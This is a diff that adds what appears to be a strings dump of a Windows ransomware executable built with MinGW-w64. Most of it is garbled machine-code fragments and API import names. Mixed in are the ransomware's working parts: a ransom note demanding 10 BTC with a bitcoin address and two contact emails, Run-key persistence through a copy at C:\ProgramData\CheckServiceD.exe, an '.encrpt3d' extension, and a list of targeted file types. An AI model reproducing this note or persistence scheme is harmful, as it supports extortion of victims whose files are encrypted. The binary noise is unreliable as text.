@@ -1,0 +1,190 @@
+!This program cannot be run in DOS mode.
+P`.data
+.rdata
+`@.pdata
+0@.xdata
+0@.bss
+.idata
+8MZtXH
+AUATUWVSH
+[^_]A\A]
+AWAVAUATUWVSH
+H;T$(u
+8[^_]A\A]A^A_
+AWAVAUATUWVSH
+H9T$(u
+2L$;3L$<D1
+2L$:3L$<D1
+@2l$=H
+D2|$:D2|$;E1
+@2l$>1
+D2l$:D2l$;D3l$<D
+H[^_]A\A]A^A_
+ATUWVSH
+ [^_]A\
+ATUWVSH
+ [^_]A\
+AUATUWVSH
+([^_]A\A]
+AWAVAUATUWVSH
+([^_]A\A]A^A_
+([^_]A\A]A^A_
+D$,A:\
+ATUWVSH
+0[^_]A\
+H3t$(D
+0[^_]A\
+ATUWVSH
+PHc5sm
+P[^_]A\
+UAWAVAUATWVSH
+[^_A\A]A^A_]
+ATUWVSH
+ [^_]A\
+([^_]H
+:MZu]H
+tQHcJ<H
+tKIc@<H
+tFIcH<L
+tLIcC<L
+ATUWVSH
+`[^_]A\
+ATUWVSH
+[^_]A\
+win32app
+.encrpt3d
+USERPROFILE
+HOMEDRIVE
+CheckServiceD
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Software\Microsoft\Windows\CurrentVersion\Run
+C:\ProgramData\CheckServiceD.exe
+ye64T0p
+STATIC
+|\    ) | (    /|
+| /   ) | (   \ |
+) (   ) | (   ) (
+!WARNING!
+Your files has been ENCRYPTED! Now, you cant access them, but they are not deleted. We need to get 10 BTC at the specified address:
+-------------------------------------------------------------------------
+19B5Bt11oUqYnwSXfBgRpwwDGg5Ajirbjn
+-------------------------------------------------------------------------
+by 15.05.2021. If we recieve 10 BTC, we will send text document to you mail with a PRIVATE RSA key, and a link to a program, that can decrypt all files on every computer, encrypted with this program
+If we recieve moneys, 
+ for acquiring decryption key, please send us
+ address of your bitcoin wallet.
+Whiteblackgroup002@gmail.com ; Wbgroup022@gmail.com
+.ONETOC2
+.BACKUP
+.CLASS
+.ACCDB
+.SQLITEDB
+.SQLITE3
+Argument domain error (DOMAIN)
+Argument singularity (SIGN)
+Overflow range error (OVERFLOW)
+Partial loss of significance (PLOSS)
+Total loss of significance (TLOSS)
+The result is too small to be represented (UNDERFLOW)
+Unknown error
+_matherr(): %s in %s(%g, %g)  (retval=%g)
+Mingw-w64 runtime failure:
+Address %p has no image-section
+  VirtualQuery failed for %d bytes at address %p
+  VirtualProtect failed with code 0x%x
+  Unknown pseudo relocation protocol version %d.
+  Unknown pseudo relocation bit size %d.
+.pdata
+__powi
+GCC: (x86_64-posix-seh-rev0, Built by MinGW-W64 project) 8.1.0
+GCC: (x86_64-posix-seh-rev0, Built by MinGW-W64 project) 8.1.0
+RegCloseKey
+RegGetValueA
+RegOpenKeyExA
+RegSetValueExA
+CreateSolidBrush
+GetStockObject
+SetBkMode
+SetTextColor
+CopyFileA
+DeleteCriticalSection
+EnterCriticalSection
+GetCurrentProcess
+GetCurrentProcessId
+GetCurrentThreadId
+GetDriveTypeA
+GetFileAttributesA
+GetLastError
+GetLogicalDrives
+GetModuleFileNameA
+GetStartupInfoA
+GetSystemTimeAsFileTime
+GetTickCount
+InitializeCriticalSection
+LeaveCriticalSection
+QueryPerformanceCounter
+RtlAddFunctionTable
+RtlCaptureContext
+RtlLookupFunctionEntry
+RtlVirtualUnwind
+SetUnhandledExceptionFilter
+TerminateProcess
+TlsGetValue
+UnhandledExceptionFilter
+VirtualProtect
+VirtualQuery
+__C_specific_handler
+__getmainargs
+__initenv
+__iob_func
+__lconv_init
+__set_app_type
+__setusermatherr
+_acmdln
+_amsg_exit
+_cexit
+_errno
+_findclose
+_findfirst64
+_findnext64
+_fmode
+_fullpath
+_initterm
+_onexit
+_stat64
+_time64
+calloc
+fclose
+fprintf
+fwrite
+getenv
+malloc
+memcpy
+rename
+signal
+strcat
+strcmp
+strcpy
+strlen
+strncmp
+strncpy
+strrchr
+vfprintf
+CreateWindowExA
+DefWindowProcA
+DispatchMessageA
+GetDesktopWindow
+GetMessageA
+GetWindowRect
+LoadCursorA
+PostQuitMessage
+RegisterClassExA
+SetClassLongPtrA
+ShowWindow
+TranslateMessage
+UpdateWindow
+ADVAPI32.dll
+GDI32.dll
+KERNEL32.dll
+msvcrt.dll
+USER32.dll
